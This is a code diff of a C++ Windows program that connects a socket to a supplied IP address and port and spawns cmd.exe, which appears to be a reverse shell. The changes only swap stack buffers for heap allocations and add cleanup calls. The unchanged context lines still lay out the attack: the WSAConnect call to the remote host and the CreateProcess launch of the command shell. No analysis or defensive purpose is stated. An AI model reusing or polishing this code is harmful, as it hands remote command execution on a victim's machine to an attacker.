@@ -13,7 +13,8 @@ int main()
     WSADATA wsa;
     SOCKET shell;
     int connection;
-    char ip_addr[16], port_str[6];
+    char* ip_addr = new char[16];
+    char* port_str = new char[6];
     char RecvServer[512];
     int port;
 
@@ -29,6 +30,8 @@ int main()
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
         printf("WSAStartup failed. Error Code : %d", WSAGetLastError());
+        delete[] ip_addr;
+        delete[] port_str;
         return 1;
     }
 
@@ -37,6 +40,8 @@ int main()
     if (shell == INVALID_SOCKET)
     {
         printf("Socket creation failed. Error Code : %d", WSAGetLastError());
+        delete[] ip_addr;
+        delete[] port_str;
         return 1;
     }
 
@@ -45,27 +50,29 @@ int main()
     shell_addr.sin_family = AF_INET;
     shell_addr.sin_port = htons(port);
     shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
-    
+
     /*********************
     CONNECTION
     *********************/
-    
+
     // Connect to remote server
     connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
     if (connection == SOCKET_ERROR)
     {
         printf("Connection to the target server failed. Error Code : %d", WSAGetLastError());
+        delete[] ip_addr;
+        delete[] port_str;
         return 1;
     }
 
     // Receive server response
     recv(shell, RecvServer, sizeof(RecvServer), 0);
-    
-    
+
+
     /*********************
     SHELL EXECUTION
     *********************/
-    
+
     // Execute shell
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -78,6 +85,8 @@ int main()
     if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL, &si, &pi))
     {
         printf("Failed to create process. Error Code : %d", GetLastError());
+        delete[] ip_addr;
+        delete[] port_str;
         return 1;
     }
 
@@ -89,6 +98,7 @@ int main()
     CloseHandle(pi.hThread);
     memset(RecvServer, 0, sizeof(RecvServer));
 
+    delete[] ip_addr;
+    delete[] port_str;
     return 0;
 }
-
